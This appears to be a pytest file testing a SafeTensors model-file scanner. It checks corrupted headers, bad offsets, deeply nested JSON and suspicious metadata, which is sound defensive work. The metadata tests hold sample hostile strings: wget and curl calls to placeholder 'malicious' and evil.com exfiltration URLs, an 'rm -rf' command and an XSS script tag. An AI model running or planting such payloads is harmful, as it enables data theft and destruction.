import json
import struct
from pathlib import Path

import numpy as np
from safetensors.numpy import save_file

from modelaudit.scanners.safetensors_scanner import SafeTensorsScanner


def create_safetensors_file(path: Path) -> None:
    data: dict[str, np.ndarray] = {
        "t1": np.arange(10, dtype=np.float32),
        "t2": np.ones((2, 2), dtype=np.int64),
    }
    save_file(data, str(path))


def test_valid_safetensors_file(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is True
    assert not result.has_errors
    assert result.metadata.get("tensor_count") == 2


def test_corrupted_header(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    corrupt_path = tmp_path / "corrupt.safetensors"
    with open(file_path, "rb") as f:
        data = bytearray(f.read())

    header_len = struct.unpack("<Q", data[:8])[0]
    header = data[8 : 8 + header_len]
    corrupt_header = header[:-10]  # truncate more to break JSON
    new_len = struct.pack("<Q", len(corrupt_header))
    corrupt_path.write_bytes(new_len + corrupt_header + data[8 + header_len :])

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(corrupt_path))

    assert result.has_errors
    assert any("json" in issue.message.lower() or "header" in issue.message.lower() for issue in result.issues)


def test_bad_offsets(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    bad_path = tmp_path / "bad_offsets.safetensors"
    with open(file_path, "rb") as f:
        header_len = struct.unpack("<Q", f.read(8))[0]
        header_bytes = f.read(header_len)
        rest = f.read()

    header = json.loads(header_bytes.decode("utf-8"))
    first = next(k for k in header if k != "__metadata__")
    header[first]["data_offsets"] = [0, 2]  # incorrect
    new_header_bytes = json.dumps(header).encode("utf-8")
    new_len = struct.pack("<Q", len(new_header_bytes))
    bad_path.write_bytes(new_len + new_header_bytes + rest)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(bad_path))

    assert result.has_errors
    assert any("offset" in issue.message.lower() for issue in result.issues)


def test_deeply_nested_header(tmp_path: Path) -> None:
    """Ensure deeply nested headers are handled gracefully."""
    import sys

    # Create a deeply nested structure that will definitely trigger RecursionError
    # Use a much larger depth to ensure we exceed recursion limits across Python versions
    # Some Python versions/implementations have higher limits or optimizations
    base_limit = sys.getrecursionlimit()
    depth = max(base_limit * 2, 3000)  # Use at least 3000 or 2x the limit

    # Build the deeply nested JSON string manually
    header_str = '{"a":' * depth + "{}" + "}" * depth
    header_bytes = header_str.encode("utf-8")

    file_path = tmp_path / "deep.safetensors"
    with open(file_path, "wb") as f:
        f.write(struct.pack("<Q", len(header_bytes)))
        f.write(header_bytes)
        f.write(b"\x00")

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.has_errors
    # Check that either RecursionError was caught OR the header was marked as invalid/deeply nested
    # Also check for generic JSON error since deeply nested JSON might fail differently
    # Include tensor validation errors as acceptable since deeply nested but valid JSON
    # will parse successfully but create invalid SafeTensors structure
    assert any(
        (check.details and check.details.get("exception_type") == "RecursionError")
        or "deeply nested" in check.message.lower()
        or "recursion" in check.message.lower()
        or "invalid json" in check.message.lower()
        or "offsets out of bounds" in check.message.lower()  # Acceptable for this test
        for check in result.checks
    )


def test_suspicious_metadata(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"info": "wget http://malicious"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert any("suspicious metadata" in issue.message.lower() for issue in result.issues)


def test_mixed_suspicious_patterns(tmp_path: Path) -> None:
    """Test that both simple patterns and regex patterns are detected from the same metadata value."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Metadata containing both simple pattern (import) and regex pattern (URL)
    metadata = {"malicious_code": "import os; os.system('curl https://malicious.example.com/exfiltrate')"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    # Should detect BOTH the import pattern AND the URL pattern
    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should have detected at least 2 issues: one for import, one for URL
    assert len(suspicious_issues) >= 2, (
        f"Expected at least 2 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Verify that different types of issues are detected
    issue_messages = [issue.why for issue in suspicious_issues if issue.why]

    # Should have both simple pattern detection and regex pattern detection
    has_code_pattern = any("code-like patterns" in msg for msg in issue_messages)
    has_regex_pattern = any("suspicious pattern" in msg for msg in issue_messages)

    assert has_code_pattern, "Should detect import statement as code-like pattern"
    assert has_regex_pattern, "Should detect URL as regex-based suspicious pattern"


def test_multiple_distinct_patterns(tmp_path: Path) -> None:
    """Test detection of multiple different types of suspicious patterns."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Multiple metadata fields with different suspicious patterns
    metadata = {
        "setup": "rm -rf /tmp/test",  # Shell command (regex pattern)
        "code": "import subprocess",  # Import statement (simple pattern)
        "callback": "https://evil.com/exfiltrate",  # URL (regex pattern)
        "script": "<script>alert('xss')</script>",  # Script injection (regex pattern)
    }
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should detect issues for each metadata field
    assert len(suspicious_issues) >= 4, (
        f"Expected at least 4 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Check that different metadata keys are flagged
    flagged_keys = set()
    for issue in suspicious_issues:
        # Extract key name from message like "Suspicious metadata value for setup"
        if "for " in issue.message:
            key = issue.message.split("for ")[-1]
            flagged_keys.add(key)

    expected_keys = {"setup", "code", "callback", "script"}
    assert flagged_keys.issuperset(expected_keys), (
        f"Expected all keys {expected_keys} to be flagged, got {flagged_keys}"
    )
